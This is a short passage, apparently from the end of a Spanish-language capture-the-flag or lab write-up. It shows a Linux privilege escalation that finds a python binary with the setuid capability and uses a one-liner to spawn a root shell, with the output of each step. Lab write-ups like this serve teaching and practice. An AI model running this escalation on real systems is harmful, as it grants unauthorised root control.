/sbin/getcap -r / 2>/dev/null
```

Info:

```
/opt/python3 cap_setuid=ep
```

Por lo que podremos hacer lo siguiente:

```shell
/opt/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Info:

```
root@c103b3df70e5:/tmp# whoami
root
```

Y con esto seremos `root`, por lo que habremos terminado la maquina.
